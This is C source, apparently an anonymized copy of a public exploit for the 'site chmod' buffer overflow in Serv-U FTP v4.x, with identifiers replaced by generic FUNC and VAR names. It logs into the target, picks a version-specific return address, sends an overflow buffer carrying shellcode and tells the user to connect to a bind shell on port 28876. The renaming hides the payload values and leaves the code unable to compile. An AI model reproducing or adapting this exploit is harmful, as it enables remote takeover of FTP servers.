
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_2__ TYPE_1__ ;


struct TYPE_2__ {int s_addr; } ;
struct sockaddr_in {TYPE_1__ sin_addr; int sin_port; int sin_family; } ;
struct sockaddr {int dummy; } ;


 int VAR_0 ;
 int VAR_1 ;
 int VAR_2 ;
 int VAR_3 ;
 char* VAR_4 ;
 int VAR_5 ;
 int VAR_6 ;
 int FUNC_0 (char*) ;
 int FUNC_1 (int (*) (int ,int ,int )) ;
 int FUNC_2 (int,struct sockaddr*,int) ;
 int VAR_7 ;
 int FUNC_3 (int) ;
 int VAR_8 ;
 int FUNC_4 (int,char*) ;
 char* FUNC_5 (char*,int,int ) ;
 int FUNC_6 (int ) ;
 int FUNC_7 (char*) ;
 scalar_t__ FUNC_8 (int) ;
 int FUNC_9 (char*,char*,int) ;
 int FUNC_10 (char*,int ,int) ;
 int FUNC_11 (char*) ;
 int FUNC_12 (char*,...) ;
 char* VAR_9 ;
 char* VAR_10 ;
 char* VAR_11 ;
 int FUNC_13 (char*,char*) ;
 char* VAR_12 ;
 int VAR_13 ;
 int FUNC_14 (int ,int ,int ) ;
 scalar_t__ FUNC_15 (char*,float) ;
 int FUNC_16 (char*) ;
 scalar_t__ FUNC_17 (char*,float) ;
 char* FUNC_18 (char*,char*) ;

int FUNC_19(int VAR_14, char *VAR_15[], char *VAR_16[]) {
  struct sockaddr_in VAR_17;
  char *VAR_18, VAR_19[256];
  char *VAR_20 = ((void*)0);
  char *VAR_21 = ((void*)0);

  if (VAR_14<5) {
    FUNC_12("Usage: %s IP PORT USERNAME PASSWORD [DIRECTORY]\n", VAR_15[0]);
    FUNC_3(-1);
  }

  FUNC_12("- Serv-ME ----------------------------------------------------\n"
         "  Serv-U v4.x \"site chmod\" exploit.\n"
         "  Written by SkyLined <SkyLined@EduP.TUDelft.nl>.\n"
         "  Credits for the vulnerability go to ICBM <icbm@0x557.net>.\n"
         "  Thanks to H D Moore for the shellcode (www.metasploit.com).\n"
         "  Greets to everyone at 0dd and #netric.\n"
         "  (K)(L)(F) for Suzan.\n"
         "\n"
         "  Binds a shell at %s:28876 if successfull.\n"
         "  Tested with: v4.0.0.4, v4.1.0.0, v4.1.0.3 on W2K-EN.\n"
         "--------------------------------------------------------------\n",
           VAR_15[1]);

  VAR_17.sin_family = VAR_0;
  VAR_17.sin_port = FUNC_6(FUNC_0(VAR_15[2]));
  VAR_17.sin_addr.s_addr = FUNC_7(VAR_15[1]);

  FUNC_12("\n[+] Connecting to %s:%s...\n", VAR_15[1], VAR_15[2]);
  if ((VAR_13 = FUNC_14(VAR_0, VAR_6, VAR_2)) == -1) {
    FUNC_11("Socket creation failed");
    FUNC_3(-1);
  }
  if (FUNC_2(VAR_13, (struct sockaddr *)&VAR_17, sizeof VAR_17) == -1) {
    FUNC_11("Connection failed");
    FUNC_3(-1);
  }
  VAR_1 = FUNC_4(VAR_13, "r");
  FUNC_12("    --> %s", FUNC_5(VAR_19, sizeof VAR_19, VAR_1));
  if (FUNC_18(VAR_19, "220 Serv-U FTP Server v4.") != VAR_19) {
    FUNC_12("[-] This is not a Serv-U v4.X ftp server.\n");
    FUNC_3(-1);
  }
  if (FUNC_18(VAR_19, "v4.1") > 0) {
    VAR_20 = VAR_11;
    VAR_21 = "4.1.0.3";
  }

  FUNC_12("\n[+] Login in as %s:%s...\n", VAR_15[3], VAR_15[4]);
  FUNC_13("USER", VAR_15[3]);
  FUNC_12("    --> %s", FUNC_5(VAR_19, sizeof VAR_19, VAR_1));
  FUNC_13("PASS", VAR_15[4]);
  FUNC_12("    --> %s", FUNC_5(VAR_19, sizeof VAR_19, VAR_1));
  if (FUNC_18(VAR_19, "230") != VAR_19) {
    FUNC_12("[-] Login failed.\n");
    FUNC_3(-1);
  }

  if (VAR_15[5]) {
    FUNC_12("\n[+] Changing directory...\n");
    FUNC_13("CD", VAR_15[5]);
    FUNC_12("    --> %s", FUNC_5(VAR_19, sizeof VAR_19, VAR_1));
  }

  VAR_18 = (char*) FUNC_8(VAR_8 + FUNC_16(VAR_12));
  FUNC_10(VAR_18, VAR_3, VAR_8);
  FUNC_9(VAR_18+VAR_8, VAR_12, FUNC_16(VAR_12));

  FUNC_12("\n[+] Checking if \\xff doubling is nescesary: ");
  FUNC_13("SITE CHMOD 477", "-\xff\xff-");
  FUNC_5(VAR_19, sizeof VAR_19, VAR_1);
  if (FUNC_15(VAR_19, '\xff') == FUNC_17(VAR_19, '\xff')) {
    VAR_7 = 1;
    FUNC_12("Yes.");
    VAR_20 = VAR_9;
    VAR_21 = "4.0.0.4";
  } else {
    FUNC_12("No.");
    if (VAR_20==((void*)0)) {
      VAR_20 = VAR_10;
      VAR_21 = "4.1.0.0";
    }
  }
  FUNC_12("\n[+] Serv-U FTP server version %s: using retaddress 0x%08x",
                      VAR_21, *(int*)VAR_20);
  FUNC_9(VAR_18 + VAR_5, VAR_4, FUNC_16(VAR_4));
  FUNC_9(VAR_18 + VAR_5 + 4, VAR_20, FUNC_16(VAR_20));

  FUNC_12("\n[+] Sending exploit... ");
  FUNC_13("SITE CHMOD 477", VAR_18);
  FUNC_12("send, you can now try to connect to %s:28876.\n", VAR_15[1]);
  FUNC_12("    --> %s", FUNC_5(VAR_19, sizeof VAR_19, VAR_1));
  FUNC_1(FUNC_14);
  FUNC_12("\n[+] Done. \n");
}
